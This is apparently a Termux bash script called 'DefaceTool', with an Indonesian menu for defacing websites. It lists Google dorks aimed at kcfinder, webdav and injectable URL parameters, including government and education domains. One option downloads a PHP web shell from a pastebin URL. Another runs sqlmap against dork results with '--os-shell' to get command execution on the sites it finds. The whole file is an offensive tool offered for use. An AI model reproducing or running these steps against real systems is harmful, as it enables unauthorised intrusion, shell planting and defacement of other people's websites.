#!/usr/bin/bash
#Copyright© 2019 by Fajar Firdaus
clear
echo "\033[35;1m[$]======================================[$]"
echo "\033[34;1mAuthor : Fajar Firdaus "
echo "\033[34;1mFb : Fajar Firdaus"
echo "\033[34;1mIG : fajar_firdaus_7"
echo "\033[34;1mYT : iTech7732"
echo "\033[35;1m[$]======================================[$]"
clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
toilet -f pagga.tlf DefaceTool --gay
echo $white "[#]==================================================[#]"
echo $blue "(1).> Dork Bypass Admin"
echo $blue "(2).> Dork kcfinder"
echo $blue "(3).> Dork webdav"
echo $blue "(4).> Script Deface"
echo $blue "(5).> Deface Website Dengan Webdav"
echo $blue "(6).> Deface Website Dengan Kcfinder (using shell)"
echo $blue "(7).> Auto pasang shell dengan sqlmap"
echo $yello "(0).> Keluar"
echo $white "[#]==================================================[#]"
read -p "root@DefaceTool-#" bego

if [ $bego = 1 ] || [ $bego = 1 ]
then
clear
cd module
sh module.sh
fi

if [ $bego = 2 ] || [ $bego = 2 ]
then
clear
echo "\033[37;1m[$]============Dork_Kcfinder============[$]"
sleep 1
echo "\033[36;1minurl:/asset/kcfinder"
sleep 1
echo "\033[36;1msites/all/modules/civicrm/packages/kcfinder"
sleep 1
echo "\033[36;1minurl:templates/_editor/kcfinder/"
sleep 1
echo "\033[36;1minurl:includes/kcfinder/browse.php"
sleep 1
echo "\033[36;1minurl:/kcfinder/browse.php"
sleep 1
echo "\033[36;1mlib/kcfinder/files/upload"
sleep 1
echo "\033[36;1madmin/kcfinder/files/upload"
sleep 1
echo "\033[36;1mpanel/kcfinder/upload/files"
sleep 1
echo "\033[36;1meditor/kcfinder/upload"
sleep 1
echo "\033[36;1mKcfinder/upload/files"
sleep 1
echo "\033[36;1minurl:/panel/kcfinder/ext:png"
sleep 1
echo "\033[37;1m[$]============Dork_Kcfinder============[$]"
echo ""
echo "(1).> Mau buka browser ?"
echo "(0).> Kembali ke tools "
echo ""
read -p "Pilih : " asw

if [ $asw = 1 ]
then
echo "Buka Browser !"
xdg-open "www.google.com"
fi

if [ $asw = 2 ]
then
exit
sh defacetool.sh
fi
fi

if [ $bego = 3 ] || [ $bego = 3 ]
then
clear
echo $white "+---+ListDork+---+"
echo "inurl:webdav"
echo "inurl:*.edu/*.asp"
echo "inurl:.gov.*/*.asp"
echo "inurl:*.gov/*.asp"
echo "inurl:.org/*.aspinurl:.ag/*.asp"
echo "inurl:.it/*.asp"
echo "inurl:.uk/*.asp"
echo "inurl:.co.il/*.asp"
echo "inurl:.com/*.asp"
echo "inurl:.co.id/*.asp"
echo "inurl:.ah.cn/*.asp"
echo "inurl:.bj.cn/*.asp"
echo "inurl:.cq.cn/*.asp"
echo "inurl:.fj.cn/*.asp"
echo "inurl:.gd.cn/*.asp"
echo "inurl:.gs.cn/*.asp"
echo "inurl:.gz.cn/*.asp"
echo "inurl:.gx.cn/*.asp"
echo "inurl:.ha.cn/*.asp"
echo "inurl:.hb.cn/*.asp"
echo "inurl:.he.cn/*.asp"
echo "inurl:.hi.cn/*.asp"
echo "inurl:.hl.cn/*.asp"
echo "inurl:.hn.cn/*.asp"
echo "inurl:.jl.cn/*.asp"
echo "inurl:.js.cn/*.asp"
echo "inurl:.jx.cn/*.asp"
echo "inurl:.ln.cn/*.asp"
echo "inurl:.nm.cn/*.asp"
echo "inurl:.nx.cn/*.asp"
echo "inurl:.qh.cn/*.asp"
echo "inurl:.sc.cn/*.asp"
echo "inurl:.sd.cn/*.asp"
echo "inurl:.sh.cn/*.asp"
echo "inurl:.sn.cn/*.asp"
echo "inurl:.sx.cn/*.asp"
echo "inurl:.tj.cn/*.asp"
echo "inurl:.tw.cn/*.asp"
echo "inurl:.xj.cn/*.asp"
echo "inurl:.xz.cn/*.asp"
echo "inurl:.yn.cn/*.asp"
echo "inurl:.zj.cn/*.asp"
echo "inurl:.ac.cn/*.asp"
echo "inurl:.com.cn/*.asp"
echo $white "+---+Tinggal_Copas_Saja+---+"
echo ""
echo "(1).> Mau buka browser ?"
echo "(0).> Kembali ke tools "
echo ""
read -p "Pilih : " asw

if [ $asw = 1 ]
then
echo "Buka Browser !"
xdg-open "www.google.com"
fi

if [ $asw = 2 ]
then
exit
sh defacetool.sh
fi
fi

if [ $bego = 4 ] || [ $bego = 4 ]
then
clear
sh sc.sh
fi

if [ $bego = 5 ] || [ $bego = 5 ]
then
clear
pkg install curl -y
read -p "Masukan Hostname Website : " host
read -p "Masukan Script Deface (pastika sc deface berada di memory internal) (contoh : /storage/emulated/0/script.php)" ash
curl /storage/emulated/0/$ash $host
fi

if [ $bego = 6 ] || [ $bego = 6 ]
then
clear
pkg install curl -y
figlet Downloading script shell buat deface
echo "Connecting server."
sleep 0.1
clear
echo "Connecting server.."
sleep 0.1
clear
echo "Connecting server..."
sleep 0.1
clear
echo "Connecting server...."
sleep 0.1
clear
echo "Connecting server....."
sleep 1
clear
echo "Connecting server......"
sleep 1
clear
echo "Connected Succesfully !!"
curl -o shell.php https://pastebin.com/raw/0GNHTFNn
mv shell.php /storage/emulated/0
echo "Check script shell di memory internal"
sleep 1
echo "Masukan Dork di browser !!"
sleep 2
echo "Browser Opened"
sleep 1
xdg-open "www.google.com "
fi

if [ $bego = 7 ] || [ $bego = 7 ]
then
clear
pkg install git -y
pkg install python2 -y
pip2 install termcolor
echo "[!]=============ListDork=============[!]"
sleep 0.1
echo "view_items.php?id="
sleep 0.1
echo "home.php?cat="
sleep 0.1
echo "item_book.php?CAT="
sleep 0.1
echo "www/index.php?page="
sleep 0.1
echo "schule/termine.php?view="
sleep 0.1
echo "goods_detail.php?data="
sleep 0.1
echo "storemanager/contents/item.php?page_code="
sleep 0.1
echo "view_items.php?id="
sleep 0.1
echo "customer/board.htm?mode="
sleep 0.1
echo "help/com_view.html?code="
sleep 0.1
echo "n_replyboard.php?typeboard="
sleep 0.1
echo "eng_board/view.php?T****="
sleep 0.1
echo "prev_results.php?prodID="
sleep 0.1
echo "bbs/view.php?no="
sleep 0.1
echo "gnu/?doc="
sleep 0.1
echo "zb/view.php?uid="
sleep 0.1
echo "global/product/product.php?gubun="
sleep 0.1
echo "m_view.php?ps_db="
sleep 0.1
echo "productlist.php?tid="
sleep 0.1
echo "product-list.php?id="
sleep 0.1
echo "onlinesales/product.php?product_id="
sleep 0.1
echo "garden_equipment/Fruit-Cage/product.php?pr="
sleep 0.1
echo "product.php?shopprodid="
sleep 0.1
echo "product_info.php?products_id="
sleep 0.1
echo "productlist.php?tid="
sleep 0.1
echo "showsub.php?id="
sleep 0.1
echo "productlist.php?fid="
sleep 0.1
echo "products.php?cat="
sleep 0.1
echo "products.php?cat="
sleep 0.1
echo "product-list.php?id="
sleep 0.1
echo "product.php?sku="
sleep 0.1
echo "store/product.php?productid="
sleep 0.1
echo "products.php?cat="
sleep 0.1
echo "productList.php?cat="
sleep 0.1
echo "product_detail.php?product_id="
sleep 0.1
echo "product.php?pid="
sleep 0.1
echo "view_items.php?id="
sleep 0.1
echo "[!]=============ListDork=============[!]"
sleep 1
echo "Tinggal Copas saja"
read -p "Masukan Dork : " d
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
python2 sqlmap.py -g $d --dbs --batch --level=2 --risk=2 --os-shell --output=hasil
sleep 1
echo "Done !"
fi

if [ $bego = 0 ] || [ $bego = 0 ]
then
clear
echo "\033[31;1mTerimakasih Telah Menggunakan Tools ini :)"
sleep 0.1
echo "\033[31;1mJangan Di Recode yak :)"
sleep 0.1
echo "\033[31;1mCopyright© 2019 By Fajar Firdaus"
exit
fi
